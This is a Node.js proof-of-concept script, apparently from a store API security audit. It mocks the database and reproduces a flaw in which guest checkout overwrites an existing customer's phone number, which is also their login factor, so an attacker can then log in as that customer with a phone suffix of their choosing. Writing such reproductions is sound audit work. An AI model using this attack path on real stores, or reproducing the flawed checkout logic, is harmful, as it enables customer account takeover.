const fs=require('node:fs'),vm=require('node:vm'),ts=require('typescript');
const file='supabase/functions/store-api/index.ts';
const sf=ts.createSourceFile(file,fs.readFileSync(file,'utf8'),ts.ScriptTarget.Latest,true);
const declarations=['handleCheckout','handleCustomerLogin'].map(name=>sf.statements.find(n=>ts.isFunctionDeclaration(n)&&n.name.text===name).getText(sf)).join('\n');
const customer={id:'customer-fixture',name:'Original',email:'victim@example.invalid',phone:'900001234'};let phoneOverwritten=false;
function chain(table){return new Proxy({}, {get(_,name){if(name==='then')return (resolve,reject)=>Promise.resolve({data:table==='customers'?{...customer}:null,error:null}).then(resolve,reject);return (...args)=>{if(table==='customers'&&name==='update'){Object.assign(customer,args[0]);phoneOverwritten=true;}return chain(table);};}});}
const fake={from:table=>chain(table),rpc:async()=>{throw new Error('TEST_STOP_BEFORE_ORDER_CREATION')}};
const box=vm.createContext({console,handleValidateCart:async()=>({subtotal:10,total:10,discount_total:0,items:[]})});
vm.runInContext(ts.transpileModule(declarations,{compilerOptions:{target:ts.ScriptTarget.ES2022}}).outputText,box);
(async()=>{let stopped;try{await box.handleCheckout(fake,'org-fixture',{customer:{name:'Changed',email:customer.email,phone:'900009999'},items:[{product_id:'fixture',quantity:1}]});}catch(e){stopped=e.message;}
const login=await box.handleCustomerLogin(fake,'org-fixture',{email:customer.email,phone:'9999'});
if(!phoneOverwritten||login.customer_id!==customer.id)throw new Error('Reproduction failed');
const result={test:'Guest checkout overwrites login factor',reproduced:true,phoneChangedWithoutOldPhone:true,loginWithNewSuffix:true,executionStopped:stopped,network:'mocked; no order or external message created'};
fs.writeFileSync('docs/security-audit-2026-09-11/store-chain-result.json',JSON.stringify(result,null,2));console.log(JSON.stringify(result,null,2));})();
